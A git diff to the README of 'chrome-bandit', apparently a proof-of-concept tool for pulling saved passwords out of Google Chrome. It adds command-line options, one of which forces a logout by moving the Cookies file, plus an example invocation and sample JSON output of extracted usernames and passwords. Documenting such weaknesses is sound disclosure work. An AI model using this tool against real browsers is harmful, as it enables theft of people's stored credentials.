@@ -4,8 +4,26 @@ This is a proof of concept to show how your saved passwords on Google Chrome and
 
 ## Usage
 
-```sh
-chrome-bandit http://example.com
+```
+Usage: chrome-bandit [options]
+    -u, --url=<url>                  the url to extract the password from
+    -v, --verbose                    print debug messages
+    -f, --format=<type>              output format (text, json)
+    -t, --timeout=<number>           the timeout in seconds per site
+    -m, --move-cookies               temporarily remove the Chrome "Cookies" file to force the user to logout
+```
+
+Example:
+```
+./chrome-bandit --url=https://github.com/login --url=https://example.com/ --move-cookies --format=json
+```
+
+Output:
+```json
+[
+    {"origin":"https://github.com","credentials":["masasron","sec3etpassw0rd"]},
+    {"origin":"https://example.com","credentials":["ronmasas","123456"]}
+]
 ```
 
 ## Background
